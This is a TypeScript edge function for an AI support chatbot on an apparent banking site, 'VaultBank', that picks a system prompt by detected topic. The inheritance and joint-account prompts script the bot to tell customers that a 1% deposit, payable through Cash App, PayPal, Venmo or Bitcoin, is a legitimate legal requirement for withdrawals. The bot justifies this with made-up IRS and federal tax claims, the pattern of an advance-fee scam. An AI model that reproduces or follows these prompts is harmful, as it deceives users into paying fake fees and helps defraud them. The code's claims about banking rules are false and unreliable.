import "https://deno.land/x/xhr@0.1.0/mod.ts";
import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2';

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const { message, ticketId } = await req.json();
    
    const supabaseUrl = Deno.env.get('SUPABASE_URL')!;
    const supabaseKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;
    const lovableApiKey = Deno.env.get('LOVABLE_API_KEY');

    if (!lovableApiKey) {
      throw new Error('LOVABLE_API_KEY not configured');
    }

    const supabase = createClient(supabaseUrl, supabaseKey);

    // Get ticket info and messages for context
    const { data: ticket, error: ticketError } = await supabase
      .from('support_tickets')
      .select('*')
      .eq('id', ticketId)
      .single();

    if (ticketError || !ticket) {
      console.error('Error fetching ticket:', ticketError);
      throw new Error('Ticket not found');
    }

    // Get user profile separately
    const { data: profile } = await supabase
      .from('profiles')
      .select('full_name')
      .eq('id', ticket.user_id)
      .single();

    const { data: messages } = await supabase
      .from('support_messages')
      .select('*')
      .eq('ticket_id', ticketId)
      .order('created_at', { ascending: true });

    // Build conversation context
    const conversationHistory = messages?.map(msg => ({
      role: (msg.sender_type === 'staff' || msg.sender_type === 'bot') ? 'assistant' : 'user',
      content: msg.message
    })) || [];

    // Check if any agents are online
    const { data: onlineAgents } = await supabase
      .from('support_agents')
      .select('id')
      .eq('is_available', true)
      .limit(1);

    const hasOnlineAgents = onlineAgents && onlineAgents.length > 0;

    // Step 1: Detect topic using AI with tool calling
    const topicDetectionResponse = await fetch('https://ai.gateway.lovable.dev/v1/chat/completions', {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${lovableApiKey}`,
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        model: 'google/gemini-2.5-flash',
        messages: [
          {
            role: 'system',
            content: `You are a topic classifier for banking support. Analyze the conversation context and user message to determine which specific banking topic they are asking about.

IMPORTANT CLASSIFICATION RULES:
- If the user mentions "inheritance", "inherited account", "tax advisory", or asks about a 1% deposit requirement for withdrawals, classify as 'inheritance'
- Only classify as 'crypto' if the user explicitly mentions cryptocurrency, Bitcoin, Ethereum, crypto wallet, or crypto trading
- Consider the full conversation context, not just individual keywords
- The user email is ${profile?.full_name || 'Customer'} and their ticket context is: ${ticket?.subject || 'general inquiry'}`
          },
          ...conversationHistory.slice(-3), // Include last 3 messages for context
          { role: 'user', content: message }
        ],
        tools: [{
          type: 'function',
          function: {
            name: 'classify_topic',
            description: 'Classify the banking support topic based on conversation context',
            parameters: {
              type: 'object',
              properties: {
                topic: {
                  type: 'string',
                  enum: ['inheritance', 'joint_account', 'crypto', 'transactions', 'accounts', 'cards', 'loans', 'general'],
                  description: 'The primary topic. Use "inheritance" for questions about inherited accounts, tax advisories, or 1% withdrawal deposits. Use "crypto" ONLY for cryptocurrency-specific questions about Bitcoin, Ethereum, crypto wallets, or crypto trading.'
                }
              },
              required: ['topic']
            }
          }
        }],
        tool_choice: { type: 'function', function: { name: 'classify_topic' } }
      }),
    });

    let detectedTopic: 'inheritance' | 'joint_account' | 'crypto' | 'transactions' | 'accounts' | 'cards' | 'loans' | 'general' = 'general';
    if (topicDetectionResponse.ok) {
      const topicData = await topicDetectionResponse.json();
      const toolCall = topicData.choices?.[0]?.message?.tool_calls?.[0];
      if (toolCall?.function?.arguments) {
        const args = JSON.parse(toolCall.function.arguments);
        detectedTopic = args.topic || 'general';
        console.log('Detected topic:', detectedTopic);
      }
    }

    // Log topic analytics
    await supabase
      .from('support_topic_analytics')
      .insert({
        ticket_id: ticketId,
        user_id: ticket.user_id,
        detected_topic: detectedTopic,
        message_content: message.substring(0, 500) // Store first 500 chars for context
      });

    // Step 2: Build focused knowledge base based on detected topic
    const knowledgeBases = {
      inheritance: `INHERITANCE TAX ADVISORY - 1% DEPOSIT REQUIREMENT:

This inherited account has a special tax advisory that requires a 1% deposit of the withdrawal amount for any external transfers. This is a legitimate banking requirement.

**Why the 1% deposit is required:**
- Federal tax compliance for inherited accounts over certain thresholds
- Required documentation and reporting to tax authorities
- Protects you and future beneficiaries from tax penalties
- One-time verification per external withdrawal transaction
- Standard practice for inheritance accounts with large balances

**What the 1% covers:**
- Tax processing and compliance documentation
- IRS reporting requirements for inherited assets
- Legal protection for both you and VaultBank
- Administrative costs for inheritance account management

**Need Expert Help?** VaultBank has specialized tax professionals who work as agents in our Tax Advisory department. They are experts in inheritance tax matters and can:
- Explain your specific situation in detail
- Help you understand all tax implications
- Ensure proper compliance with federal regulations
- Guide you through the withdrawal process step-by-step
- Answer all your questions about the 1% deposit

Would you like me to connect you with one of our tax advisory agents?

Keep responses natural and conversational. Do NOT mention joint accounts, cryptocurrency, or other unrelated topics.`,

      joint_account: `JOINT ACCOUNT SYSTEM:
Adding a joint holder requires a 1% deposit of current account balance. This is a one-time commitment fee for legal documentation, verification, and compliance showing serious intent from both parties. 

**Why 1% is required:**
- Identity verification and commitment validation
- Payment method linking (ACH, Cash App, PayPal, Zelle, Venmo, Bitcoin) for instant future withdrawals
- Compliance with banking regulations
- Fraud prevention

**Process:** Primary holder submits partner details → Partner deposits 1% via chosen method → OTP verification → Document upload → Admin approval → Full account access for both parties.

Keep it natural and conversational. Do NOT mention inheritance or other unrelated topics.`,

      crypto: `CRYPTOCURRENCY SERVICES:
VaultBank supports crypto deposits and withdrawals.

**Withdrawal Steps:**
1. Navigate to Crypto Wallet in dashboard
2. Select cryptocurrency (Bitcoin, Ethereum, major coins supported)
3. Enter destination wallet address
4. Specify amount
5. Confirm and verify via SMS/OTP
6. Processing within 24-48 hours

Keep responses focused on crypto topics.`,

      transactions: `TRANSACTIONS & TRANSFERS:
Help with transaction history, transfers, payments, and account activity. Provide clear guidance on how to view, filter, and manage transactions.`,

      accounts: `ACCOUNT MANAGEMENT:
Help with account types (checking, savings), account details, balances, and general account operations.`,

      cards: `CARDS & CREDIT:
Assistance with credit cards, debit cards, card applications, limits, and card management.`,

      loans: `LOANS & LENDING:
Information about loan applications, loan types, interest rates, and repayment.`,

      general: `GENERAL BANKING SUPPORT:
VaultBank offers traditional banking (checking, savings, credit cards, loans) and cryptocurrency services. Provide helpful information and offer to connect with live agents for complex issues.`
    };

    const focusedKnowledge = knowledgeBases[detectedTopic] || knowledgeBases.general;

    const systemPrompt = `You are VaultBank's AI support assistant. 

${focusedKnowledge}

Important guidelines:
- Be helpful, professional, and conversational
- Stay focused on the detected topic: ${detectedTopic}
- Answer questions fully and naturally
- For complex or account-specific issues, offer to connect with a live agent
- If user wants to talk to an agent, confirm: ${hasOnlineAgents ? 'Live agents are currently available' : 'Live agents will be available soon'}

Customer name: ${profile?.full_name || 'Customer'}`;

    // Call Lovable AI
    const response = await fetch('https://ai.gateway.lovable.dev/v1/chat/completions', {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${lovableApiKey}`,
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        model: 'google/gemini-2.5-flash',
        messages: [
          { role: 'system', content: systemPrompt },
          ...conversationHistory,
          { role: 'user', content: message }
        ],
      }),
    });

    if (!response.ok) {
      const errorText = await response.text();
      console.error('AI gateway error:', response.status, errorText);
      throw new Error(`AI gateway error: ${response.status}`);
    }

    const data = await response.json();
    const botReply = data.choices[0].message.content;

    // Save bot message to database
    const { error: insertError } = await supabase
      .from('support_messages')
      .insert({
        ticket_id: ticketId,
        message: botReply,
        sender_type: 'bot',
        is_read: false
      });

    if (insertError) {
      console.error('Error inserting bot message:', insertError);
      throw insertError;
    }

    // Check if user is requesting to connect to an agent
    const userWantsAgent = message.toLowerCase().match(/\b(yes|sure|ok|okay|connect|agent|talk to someone|speak to|human|representative)\b/);
    
    return new Response(JSON.stringify({ 
      reply: botReply,
      suggestsLiveAgent: userWantsAgent !== null
    }), {
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });

  } catch (error: any) {
    console.error('Error in support-bot:', error);
    return new Response(JSON.stringify({ 
      error: error?.message || 'Unknown error',
      reply: "I apologize, but I'm having trouble processing your request. Would you like to connect with a live support agent?"
    }), {
      status: 500,
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  }
});